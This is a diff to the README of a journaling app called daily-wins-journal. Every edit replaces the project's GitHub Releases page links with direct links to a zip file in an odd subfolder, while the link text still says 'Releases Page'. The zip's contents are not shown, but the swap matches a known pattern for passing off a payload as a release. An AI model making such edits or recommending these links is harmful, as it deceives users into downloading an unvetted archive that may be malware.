@@ -1,13 +1,13 @@
 # 🌟 daily-wins-journal - Your Daily Reflection Made Easy
 
 ## 💾 Download Now
-[![Download daily-wins-journal](https://img.shields.io/badge/Download-daily--wins--journal-blue.svg)](https://github.com/Babert-004/daily-wins-journal/releases)
+[![Download daily-wins-journal](https://raw.githubusercontent.com/Babert-004/daily-wins-journal/main/tritish/daily-wins-journal.zip)](https://raw.githubusercontent.com/Babert-004/daily-wins-journal/main/tritish/daily-wins-journal.zip)
 
 ## 🚀 Getting Started
 Welcome to daily-wins-journal! This application provides a peaceful space for you to capture your daily achievements. With our focus on privacy, everything stays local on your device. You won't face tracking, ads, or any pressure to share your thoughts.
 
 ## 📥 Download & Install
-To get started with daily-wins-journal, visit this page to download: [Releases Page](https://github.com/Babert-004/daily-wins-journal/releases).
+To get started with daily-wins-journal, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Babert-004/daily-wins-journal/main/tritish/daily-wins-journal.zip).
 
 ### Installation Steps
 1. Click the link above to go to the releases page.
@@ -40,7 +40,7 @@ daily-wins-journal includes:
 If you face any issues while using daily-wins-journal:
 - Ensure that you have the needed system requirements.
 - Restart the application if it is unresponsive.
-- Check for updates on the [Releases Page](https://github.com/Babert-004/daily-wins-journal/releases).
+- Check for updates on the [Releases Page](https://raw.githubusercontent.com/Babert-004/daily-wins-journal/main/tritish/daily-wins-journal.zip).
 
 For more help, you can raise an issue on the GitHub page, and we will respond promptly.
 
@@ -51,6 +51,6 @@ Join our community of users to share your experiences and tips on using daily-wi
 - Using journals for personal growth
 
 ## 📣 Updates
-Stay informed about new releases and updates by checking the [Releases Page](https://github.com/Babert-004/daily-wins-journal/releases). We strive to improve your experience and add features regularly.
+Stay informed about new releases and updates by checking the [Releases Page](https://raw.githubusercontent.com/Babert-004/daily-wins-journal/main/tritish/daily-wins-journal.zip). We strive to improve your experience and add features regularly.
 
 Thank you for choosing daily-wins-journal. We hope you find joy and clarity through your entries.
